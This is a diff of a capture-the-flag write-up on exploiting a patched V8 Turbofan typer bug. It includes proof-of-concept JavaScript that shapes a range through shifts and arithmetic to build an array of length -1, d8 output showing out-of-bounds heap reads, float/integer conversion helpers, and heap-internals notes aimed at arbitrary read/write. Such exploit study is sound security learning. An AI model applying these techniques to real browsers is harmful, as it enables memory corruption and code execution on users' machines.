@@ -112,7 +112,7 @@ for (let i = 0; i < 40000; i++) {
 console.log("After optimization: " + poc("g"));
 ```
 
-If you run that script with a patched version of `d8`, you'll get the following output:
+If you run that script with a patched version of `d8` (use the release build for now), you'll get the following output:
 
 ```
 $ ./d8 ./poc.js
@@ -138,7 +138,7 @@ Let's focus on the `StringIndexOf` node (the node in blue), and the ones surroun
 
 If we switch the `TypedLowering` phase, the one directly after the `Typer` phase, we can see that `StringIndexOf` node is being optimized away, and new `[HeapConstant <true>]` has been inserted. Turbofan has noticed that `SpeculativeNumberLessThanOrEqual` node in the first picture will always evaluate to true (0 is less than or equal to all values in the range [0, 536870888]), and has decided to optimize that call out. The `String.indexOf` function will never get called, and in fact if you view further phases of the compilation, the node has been removed from the graph entirely.
 
-## Getting OOB access
+## Collapsing the Range
 The above POC demonstrates a mis-compilation, but isn't directly exploitable. We need the `StringIndexOf` call to remain, so we can sneak a -1 into code that isn't expecting it. I mentioned that in the past, a common way to exploit this type of typer bug (pun intended) was to use Turbofan's incorrect knowledge of the possible values to cause it to omit bounds checks, leading to the ability to read and write to memory outside of the array. These checks are no longer omitted, so we won't be going this route. Instead, we'll use the first part of the patch, reproduced below, to generate an array with a very large (technically negative) length, but with a backing store that has a small, finite one. This will allow us to read and write past the end of the backing store, and mess with other objects on the heap.
 
 ```
@@ -198,6 +198,201 @@ Reduction JSCreateLowering::ReduceNewArray(
 
 In normal operation, the array's length is replaced with a constant of the "known" value. As the comment mentions, this is done to ensure that the length will always equal the allocated capacity, and is a mitigation to protect against exactly the kind of bug we have now. The patch removes this mitigation, tying the array's length to the actual computed value. Note that the array's capacity (the length of the backing storage array) is still constant, as that is pulled into an `int` from the "known" length.
 
-If we can sneak our -1 into the array's length (while Turbofan thinks it's actually a small positive number), we'll be able to create an array with a small backing array, but a very large length field (technically negative, but it's treated as an unsigned integer). As a note, we don't want the capacity to be 0, since in that case the backing array is initialized to a constant. We want it to be allocated on the heap, so we can overwrite other objects. So we want the calculated range to be less than one.
+If we can sneak our -1 into the array's length (while Turbofan thinks it's actually a small positive number), we'll be able to create an array with a small backing array, but a very large length field (technically negative, but it's treated as an unsigned integer). As a note, we don't want the capacity to be 0, since in that case the backing array is initialized to a constant. We want it to be allocated on the heap, so we can overwrite other objects.
+
+So that's the constraint. We need to somehow turn the `Range(0, 536870888)` we get from `String.indexOf` into something like `Range(x, x)` where x is greater than 0 and less than or equal to 16 (we'll be targeting `Range(1, 1)`). Crucially, whatever series of operations we perform has to leave the -1 we want to slip through intact. Our weapon of choice here will be the the right shift (>>), since that "collapses" positive numbers to 0, while leaving -1 intact
+
+```js
+1 >> 10 = 0
+-1 >> 10 = -1
+```
+
+If we apply a big enough shift (0x1d, or 29 works), we can completely collapse the range of possible values. To explore how this works, lets edit the `poc()` function from the previous example.
+
+```js
+function poc(needle) {
+    let i = "abcdef".indexOf(needle);
+    return (i >> 0x1d);
+}
+
+// Rest of poc.js...
+```
+
+Running the script with `./d8 --trace-turbo poc.js`, and pull up the trace in turbolizer.
+
+![Left Shift Collapses Range](poc-shift.png)
+
+Here you can see that the range Turbofan has calculated for the `SpeculativeNumberShiftRight` is Range(0, 0). We've succeeded in collapsing the range to a single value, while keeping out -1 intact. We aren't done yet though. If you recall from earlier in this section, we actually need the length to be positive, not 0. Naively adding 1 to the return value would move the calculated range to Range(1, 1), satisfying this requirement. However, when the -1 we are trying to sneak through arrives, the addition will be applied, giving us an array of length 0, instead of negative 1. To fix this, we'll multiply by 2 first turning the -1 into a -2, before the addition brings it back to a negative 1.
+
+```js
+function poc(needle) {
+    let i = "abcdef".indexOf(needle);
+    return (i >> 0x1d) * 2 + 1;
+}
+
+// Rest of poc.js...
+```
+
+![Final Range Adjustment](poc-shift-mul-add.png)
+
+The `SpeculativeSafeIntegerAdd` node has the type we want, Range(1,1). And if we follow the arithmetic, our -1 will be preserved as well!
+
+## Out of Bounds
+It's time to put the pieces together, and create an array that gives us out of bounds access. The first step is to finally link up the two patch changes, and feed the result of the our range manipulation into the `new Array(len)` constructor.
+
+```js
+function poc(needle) {
+    let i = "abcdef".indexOf(needle);
+    i = (i >> 0x1d) * 2 + 1;
+    return new Array(i);
+}
+
+// Rest of poc.js...
+```
+
+If you run this as is, you'll get an error. Because the bugs we're dealing with only happen in the compilation phase, the code still gets *interpreted* correctly. We need to avoid sending -1 to the Array constructor until the code has been compiled.
+
+```js
+// function poc(needle) {...}
+
+// g -> f
+console.log("Before optimization: " + poc("f").length);
+
+// Cause Turbofan to optimize poc()
+for (let i = 0; i < 40000; i++) {
+    // g -> f
+    poc("f")
+}
+
+let oob = poc("g")
+console.log("After optimization: " + oob.length);
+```
+
+Running the poc now will output the following:
+
+```
+$ ./d8  poc.js
+Before optimization: 1
+After optimization: -1
+```
+
+We've done it! the `oob` array has a length of -1, which will allow us to access elements far outside it's capacity. Unfortunately, actually attempting to read any of these elements will likely cause a crash:
+
+```
+$  ./v8-binary/d8 --shell poc.js
+Before optimization: 1
+After optimization: -1
+V8 version 9.1.269.36
+d8> oob[0]
+undefined
+d8> oob[1]
+Stacktrace:
+   ptr1=0x24b1082439c9
+    ptr2=(nil)
+    ptr3=(nil)
+    ptr4=(nil)
+    failure_message_object=0x7ffccccb5ec0
+
+==== JS stack trace =========================================
+
+    0: ExitFrame [pc: 0x24b1000b2258]
+    1: StubFrame [pc: 0x24b10013773e]
+Security context: 0x24b10821017d <JSObject>
+    2: Stringify(aka Stringify) [0x24b10812bf35] [d8-stringify:38] [bytecode=0x24b108213681 offset=102](this=0x24b1080423b5 <undefined>,0x24b1082439c9 <Map(HOLEY_SMI_ELEMENTS)>,4)
+...
+```
+
+The first access (`oob[0]`) worked, because the array is allocated with a capacity of 1 (refer to the previous section for details). Why does the next one (`oob[1]`) crash? A hint is the mention of  `HOLEY_SMI_ELEMENTS` in the stack trace, which is the internal type of the array. Arrays in javascript don't have types, but v8 has several internal representations it uses for optimization purposes. Array's can be `PACKED` or `HOLEY` (missing elements), and made up of `SMI`, `DOUBLE`, or any elements. We'll learn more about SMI's in the next section, but it suffices for now to understand that the memory past the end of the array isn't in the format v8 is expecting to see for an array of this type.
+
+In order to get around this, we'll coerce the type of the array to be `HOLEY_DOUBLE_ELEMENTS`, which represents values in memory as IEEE doubles. This is easy enough, all we need to do is set an element of the array to a float.
+
+```js
+function poc(needle) {
+    let i = "abcdef".indexOf(needle);
+    i = (i >> 0x1d) * 2 + 1;
+    let a = new Array(i);
+    a[0] = 0.1;
+    return a;
+}
+
+// ...
+```
+
+Running this with `--shell` to to allow us to keep entering javascript after the script runs:
+
+```
+$  ./v8-binary/d8 --shell poc.js
+Before optimization: 1
+After optimization: -1
+V8 version 9.1.269.36
+d8> oob[0]
+0.1
+d8> oob[1]
+4.763796150676378e-270
+d8> oob[100]
+2.1160022451239437e+36
+d8>
+```
+
+Boom! We now have access to data outside the bounds of our array. The reason the numbers look so strange is because we're interpreting arbitrary memory as an IEEE double precision floating point number. Let's introduce some helper functions to convert between the floating point and integer representation of the data
+
+```js
+/// Helper functions to convert between float and integer primitives
+var buf = new ArrayBuffer(8); // 8 byte array buffer
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+
+function ftoi(val) { // typeof(val) = float
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
+}
+
+function itof(val) { // typeof(val) = BigInt
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+
+// ... Rest of poc.js
+```
+Sample usage:
+```js
+d8> ftoi(4.768128617178215e-270).toString(16)
+"80426dd082438fd"
+```
+
+These functions (stolen from [here](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)) use the BigInt class to avoid the messiness that can come from dealing with floating point numbers directly. It also helpfully takes a radix in it's `toString` method, for displaying the values in hex.
+
+We're almost there. In order to transform the primitive we have currently into an arbitrary R/W, and eventually code execution, we'll need to know more about how v8 manages and stores objects in memory.
+
+## Debugging v8
+In the next few sections, we'll be making use of a special function `d8` provides, `%DebugPrint(jsObj)`, which prints the internal structure of javascript objects. This is enabled by passing the `--allow-natives-syntax` flag to `d8`
+
+`d8` will give more information from the `%DebugPrint()` function if we use the debug build. Unfortunately, the debug build of v8 also includes additional asserts that will end up failing when we try to access our array out of bounds, so we'll only be using the debug build to explore the internals, and we'll switch back to the release build to complete our exploit.
 
 
+## v8 Heap Internals
+v8 does a lot of manual memory management and tricks to squeeze out as much performance as it can. This is a complex topic, but here is some information on the parts that are relevant for this challenge.
+
+### Bump Allocator
+Instead of using the glibc malloc() implementation, v8 uses a custom, deterministic bump allocator to hold javascript objects. This is useful for us, since it means that _most_ objects JS objects will be at known offsets. This assumption can break if you reach the end of the heap or a GC pass runs, but for this challenge it's perfectly valid.
+
+### Pointer Compression
+In an effort to save space, v8 recently introduced [pointer compression](https://v8.dev/blog/pointer-compression), switching from a 64bit value to a 32bit offset. This has a couple implications, the main one for us is that getting the full address of an object on the v8 heap becomes more difficult.
+
+A lot of existing articles and writeups are written with the old 64bit pointers, so be careful not to get tripped up when reading around online.
+
+### Pointer tagging
+v8 uses another trick with it's pointers to save space and increase performance: pointer tagging. If a value has the least significant bit is set, then the value is treated as a pointer. If it's cleared, then instead it's treated as a number. When treated as a number, the value is called a small integer, or Smi.
+
+When treating the value as a pointer, the actual offset (remember, these are compressed pointers) is calculated by first subtracting 1, clearing the LSB. This means that we lose some granularity, but keep our entire memory range addressable.
+
+Then treating the value as an Smi, the LSB is ignored, and the remaining 31 bits are treated as an integer. So we can't store a full 32 bit value, but hey, they're called "small" for a reason.
+
+```
+Pointer:    |-------- -------- -------- -------1| -> offset = raw - 1
+
+Smi:        |-------- -------- -------- -------0| -> value = raw >> 1
+```
+
+**64 bit Smis:** Before pointer compression was introduced, Smis were able to hold a full 32 bit value. They did this by keeping the lower 4 bytes entirely 0, and storing the value in the upper 4 bytes. So if you see references to Smis that look like `0x4141414100000000` in old documentation and blog posts, that's why.
